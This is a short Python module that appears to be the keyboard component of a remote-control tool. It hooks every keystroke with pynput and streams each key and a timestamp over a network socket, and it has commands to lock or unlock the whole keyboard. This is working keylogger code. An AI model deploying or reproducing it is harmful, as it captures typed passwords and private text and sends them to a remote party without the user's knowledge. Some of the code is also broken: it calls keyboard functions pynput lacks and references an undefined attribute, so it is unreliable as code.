import json
from pynput import keyboard
import time

class KeyControl:
    def __init__(self, sock, request):
        self.sock = sock
        self.request = request
        self.key_list = ''

    def on_press(self, key):
        print('{}'.format(key))
        r = '{}\t\t{}\n'.format(key, time.time())
        data = r.encode('utf-8')
        self.sock.sendall(data)

    def on_release(self, key):
        if key == keyboard.Key.esc:
            return False

    def lock_key(self):
        # locks all keys of keyboard
        for i in range(150):
            keyboard.block_key(i)

    def unlock_key(self):
        # unlocks all keys of keyboard
        for i in range(150):
            keyboard.unblock_key(i)

    def do_task(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release)

        if (self.request == 'hook_key'):
            listener.start()
        elif (self.request == 'unhook_key'):
            stop_control = keyboard.Controller()
            stop_control.press(keyboard.Key.esc)
            stop_control.release(keyboard.Key.esc)

        elif (self.request == 'lock_key'):
            self.lock_key()
        elif (self._opcode == 'unlock_key'):
            self.unlock_key()
